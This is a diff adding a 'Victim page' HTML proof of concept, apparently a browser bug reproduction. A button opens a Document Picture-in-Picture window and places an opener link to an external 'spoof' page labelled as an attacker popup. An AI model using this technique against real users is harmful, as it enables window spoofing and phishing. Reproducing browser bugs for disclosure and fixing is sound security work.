@@ -1,0 +1,15 @@
+<head><meta http-equiv="Content-Security-Policy" content="object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';" /></head>
+<h1>Victim page</h1>
+<button onclick="main()">click me</button>
+<script>
+async function main() {
+  let w = await documentPictureInPicture.requestWindow();
+
+  let link = document.createElement('a');
+  link.rel = 'opener';
+  link.target = '_blank';
+  link.href="https://ud1n1337.github.io/spoof.html";
+  link.innerText = 'Click to Open attacker popup'
+  w.document.body.appendChild(link);
+}
+</script>
